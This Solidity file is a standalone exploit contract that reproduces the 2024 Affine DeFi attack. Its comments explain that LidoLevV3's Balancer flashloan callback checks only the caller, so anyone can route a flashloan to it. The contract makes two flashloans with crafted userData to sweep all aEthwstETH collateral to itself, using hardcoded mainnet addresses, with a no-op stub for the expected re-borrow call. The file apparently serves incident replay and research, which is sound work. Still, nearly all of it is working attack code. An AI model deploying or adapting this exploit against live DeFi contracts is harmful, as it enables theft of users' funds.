// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-AffineDeFi).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ExploitTest): there is no standalone exploit contract, and the attacker IS
// the test contract itself (msg.sender / address(this) for both flashloans,
// and the `createAaveDebt` no-op destination). This contract is a faithful,
// self-contained copy of that inline attack (run() ~ testExploit, plus the
// createAaveDebt no-op) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/AffineDeFi_exp.sol.
//
// Root cause: LidoLevV3's Balancer flashloan callback `receiveFlashLoan` only
// checks `msg.sender == Balancer`. Balancer's `flashLoan` lets ANY caller name
// the recipient, so the attacker flash-loans directly to LidoLevV3 with
// userData = abi.encode(LoanType.upgrade, attacker). That reaches
// `_payDebtAndTransferCollateral(attacker)`, which repays all Aave debt and
// then transfers 100% of the aToken collateral to `attacker` with no
// validation that `attacker` is a real, honest successor strategy.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancer {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract AffineDeFiExploit {
    address constant AETHWSTETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant LIDO_LEV_V3 = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Two Balancer flashloans, both targeted at LidoLevV3, both carrying
    // userData that names THIS contract as the beneficiary/"newStrategy".
    function run() external {
        bytes memory userEncodeData = abi.encode(1, address(this)); // LoanType.divest
        bytes memory userEncodeData2 = abi.encode(2, address(this)); // LoanType.upgrade
        uint256[] memory amount = new uint256[](1);
        uint256[] memory amount2 = new uint256[](1);
        IERC20[] memory token = new IERC20[](1);

        token[0] = IERC20(WETH);
        amount[0] = 318_973_831_042_619_036_856;
        amount2[0] = 0;

        // Flashloan 1: divest — shrinks the position to a small residual,
        // self-funded via the Curve swap of unlocked wstETH -> WETH.
        IBalancer(BALANCER).flashLoan(
            IFlashLoanRecipient(LIDO_LEV_V3), token, amount, userEncodeData
        );
        // Flashloan 2: upgrade, amount 0 — repays the residual debt and
        // sweeps ALL remaining aEthwstETH collateral to this contract.
        IBalancer(BALANCER).flashLoan(
            IFlashLoanRecipient(LIDO_LEV_V3), token, amount2, userEncodeData2
        );
    }

    // LidoLevV3._payDebtAndTransferCollateral calls
    // newStrategy.createAaveDebt(debt) on the address it just paid out to,
    // expecting the "new strategy" to re-borrow the same WETH debt amount.
    // The attacker simply ignores this — a no-op, as in the original PoC.
    function createAaveDebt(uint256 /* wethAmount */) external {
        // do nothing
    }
}
